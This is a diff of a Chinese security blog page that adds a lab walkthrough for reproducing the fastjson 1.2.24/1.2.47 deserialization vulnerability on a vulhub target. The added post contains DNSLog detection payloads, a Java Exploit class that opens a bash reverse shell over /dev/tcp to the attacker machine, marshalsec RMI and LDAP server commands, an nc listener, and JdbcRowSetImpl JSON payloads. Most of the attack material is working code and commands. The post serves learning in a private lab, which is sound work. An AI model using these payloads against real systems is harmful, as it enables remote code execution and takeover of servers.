@@ -41,10 +41,14 @@
 <meta property="og:url" content="http://mamor5409.github.io/posts/37afa0e0/index.html">
 <meta property="og:site_name" content="Mamor&#39;s Blog">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://mamor5409.github.io/posts/37afa0e0/rmi1.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/37afa0e0/ldap1.png">
 <meta property="article:published_time" content="2021-06-07T01:36:28.000Z">
-<meta property="article:modified_time" content="2021-06-07T01:36:28.896Z">
+<meta property="article:modified_time" content="2021-06-08T13:17:04.340Z">
 <meta property="article:author" content="Mamor">
+<meta property="article:tag" content="反序列化">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mamor5409.github.io/posts/37afa0e0/rmi1.png">
 
 <link rel="canonical" href="http://mamor5409.github.io/posts/37afa0e0/">
 
@@ -245,6 +249,22 @@
 
               <time title="创建时间：2021-06-07 09:36:28" itemprop="dateCreated datePublished" datetime="2021-06-07T09:36:28+08:00">2021-06-07</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-06-08 21:17:04" itemprop="dateModified" datetime="2021-06-08T21:17:04+08:00">2021-06-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index"><span itemprop="name">反序列化</span></a>
+                </span>
+            </span>
 
           
             <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
@@ -259,14 +279,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>0</span>
+              <span>4.5k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>4 分钟</span>
             </span>
             <div class="post-description"> </div>
 
@@ -279,7 +299,62 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
+        <h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>fastjson 是一款阿里的开源java库，用来实现java 对象与json字符串之间的相互转化</p>
+<p>反序列化常用的两种利用方式，一种是基于rmi(Java远程方法调用)，一种是基于ldap。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>靶机 vulhub-fastjson-1.2.24</p>
+<p>ip：192.168.20.128</p>
+<p>kali：192.168.20.129</p>
+<p><code>docker-compose up -d</code> 访问<code>192.168.20.128:8090</code></p>
+<h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><h5 id="DNSLog回显"><a href="#DNSLog回显" class="headerlink" title="DNSLog回显"></a>DNSLog回显</h5><p>构造POST请求包，fastjson可以解析payload中val的值，如果dnslog有回显即为fastjson</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;:0</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h4 id="RMI方式"><a href="#RMI方式" class="headerlink" title="RMI方式"></a>RMI方式</h4><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><ol>
+<li>靶机为vulhub8090端口</li>
+<li>kali上利用python开启web服务，并把编译后的exp放到里面</li>
+<li>kali 8001端口开启 rmi 服务（rmi 远程方法调用  A主机去调用B主机上的exp.class方法）</li>
+<li>kali 8888端口监听反弹的shell</li>
+</ol>
+<h5 id="使用kali搭建一个临时web服务"><a href="#使用kali搭建一个临时web服务" class="headerlink" title="使用kali搭建一个临时web服务"></a>使用kali搭建一个临时web服务</h5><p><code>python3 -m http.server 9999</code></p>
+<h5 id="编译生产exp-放在web目录下"><a href="#编译生产exp-放在web目录下" class="headerlink" title="编译生产exp,放在web目录下"></a>编译生产exp,放在web目录下</h5><p>Exploit.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/192.168.20.129/8888 0&gt;&amp;1&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行编译<code>javac Exploit.java</code>生成Exploit.class</p>
+<p>把编译好的Exploit.class放在kali上</p>
+<h5 id="kali监听8888端口"><a href="#kali监听8888端口" class="headerlink" title="kali监听8888端口"></a>kali监听8888端口</h5><p><code>nc -lvvp 8888</code></p>
+<h5 id="启动RMI服务"><a href="#启动RMI服务" class="headerlink" title="启动RMI服务"></a>启动RMI服务</h5><p>使用marshalsec项目，启动RMI服务，监听8001端口并加载远程类Exploit.class(marshalsec和编译后的Exploit.class放在同一目录下)</p>
+<p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.20.129:9999/#Exploit&quot; 8001</code></p>
+<blockquote>
+<p>kali@kali2020:~/Common/fastjson$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “<a target="_blank" rel="noopener" href="http://192.168.20.129:9999/#Exploit&quot;">http://192.168.20.129:9999/#Exploit&quot;</a> 8001<br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</p>
+<ul>
+<li>Opening JRMP listener on 8001<br>Have connection from /192.168.20.128:49126<br>Reading message…<br>Is RMI.lookup call for Exploit 2<br>Sending remote classloading stub targeting <a target="_blank" rel="noopener" href="http://192.168.20.129:9999/Exploit.class">http://192.168.20.129:9999/Exploit.class</a><br>WARNING: An illegal reflective access operation has occurred<br>WARNING: Illegal reflective access by marshalsec.util.Reflections (file:/home/kali/Common/fastjson/marshalsec-0.0.3-SNAPSHOT-all.jar) to field com.sun.jndi.rmi.registry.ReferenceWrapper.wrappee<br>WARNING: Please consider reporting this to the maintainers of marshalsec.util.Reflections<br>WARNING: Use –illegal-access=warn to enable warnings of further illegal reflective access operations<br>WARNING: All illegal access operations will be denied in a future release<br>Closing connection</li>
+</ul>
+</blockquote>
+<p>原因貌似是因为java版本过高，这里默认使用的我昨天刚安装的javac11,换一个低版本的javac去进行编译,但是还是无法反弹shell.</p>
+<p>查了半个下午，最终发现是因为kali 的java版本问题，kali原java版本为java11,然后安装了java8 再去开启rmi服务就正常了</p>
+<p><img src="/posts/37afa0e0/rmi1.png"></p>
+<p>成功反弹shell</p>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>1.2.24 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;192.168.20.129:8001&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>1.2.47</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;192.168.20.129:8001&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="LDAP方式"><a href="#LDAP方式" class="headerlink" title="LDAP方式"></a>LDAP方式</h4><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.20.129:9999/#Exploit&quot; 8002</code></p>
+<p><img src="/posts/37afa0e0/ldap1.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;192.168.20.129:8002&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/chen-w/p/14735881.html">https://www.cnblogs.com/chen-w/p/14735881.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45556536/article/details/109486621">https://blog.csdn.net/weixin_45556536/article/details/109486621</a></p>
+<p><a target="_blank" rel="noopener" href="https://choge.top/2020/10/12/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://choge.top/2020/10/12/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hei-zi/p/13274272.html">https://www.cnblogs.com/hei-zi/p/13274272.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/naraku/blog/leak-fastjson">https://www.yuque.com/naraku/blog/leak-fastjson</a></p>
+</blockquote>
+
     </div>
 
     
@@ -332,6 +407,10 @@
 </div>
 
       <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"></i><i class="fa fa-tag"></i> 反序列化</a>
+          </div>
 
         
 
@@ -404,6 +483,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">2.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞检测</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#DNSLog%E5%9B%9E%E6%98%BE"><span class="nav-number">2.2.1.</span> <span class="nav-text">DNSLog回显</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RMI%E6%96%B9%E5%BC%8F"><span class="nav-number">2.3.</span> <span class="nav-text">RMI方式</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">2.3.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8kali%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E4%B8%B4%E6%97%B6web%E6%9C%8D%E5%8A%A1"><span class="nav-number">2.3.2.</span> <span class="nav-text">使用kali搭建一个临时web服务</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BC%96%E8%AF%91%E7%94%9F%E4%BA%A7exp-%E6%94%BE%E5%9C%A8web%E7%9B%AE%E5%BD%95%E4%B8%8B"><span class="nav-number">2.3.3.</span> <span class="nav-text">编译生产exp,放在web目录下</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#kali%E7%9B%91%E5%90%AC8888%E7%AB%AF%E5%8F%A3"><span class="nav-number">2.3.4.</span> <span class="nav-text">kali监听8888端口</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8RMI%E6%9C%8D%E5%8A%A1"><span class="nav-number">2.3.5.</span> <span class="nav-text">启动RMI服务</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload"><span class="nav-number">2.4.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LDAP%E6%96%B9%E5%BC%8F"><span class="nav-number">2.5.</span> <span class="nav-text">LDAP方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-number">3.</span> <span class="nav-text">Reference</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -473,12 +553,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">178k</span>
+    <span title="站点总字数">183k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">2:42</span>
+    <span title="站点阅读时长">2:46</span>
 </div>
 
 <!--
@@ -489,7 +569,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共44.5k字</span>
+  <span class="post-count">博客全站共45.6k字</span>
 </div>
 -->
         
